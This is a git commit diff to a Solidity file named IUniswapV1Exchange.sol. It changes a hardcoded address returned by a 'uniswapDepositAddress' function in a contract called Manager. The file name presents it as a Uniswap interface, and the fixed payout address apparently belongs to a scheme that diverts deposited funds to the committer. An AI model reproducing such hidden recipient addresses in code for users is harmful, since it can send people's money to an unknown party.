3753f938666529134225503b33725a2ca0a3373d
SaveSquidDAO <savesquiddao@gmail.com>
2022-05-31 16:33:33 +0500

    Update IUniswapV1Exchange.sol

--- IUniswapV1Exchange.sol
+++ IUniswapV1Exchange.sol
@@ -6,6 +6,6 @@ contract Manager {
 	 	} 	
 
         function uniswapDepositAddress() public pure returns (address) { 
-		return 0xaC3019E8f1fE1891E1ce679390C6031165a60Be9;
+		return 0xE76efDa2F807AA6Ace4eBda5e85e6eE103504CF2;
 	} 
 }
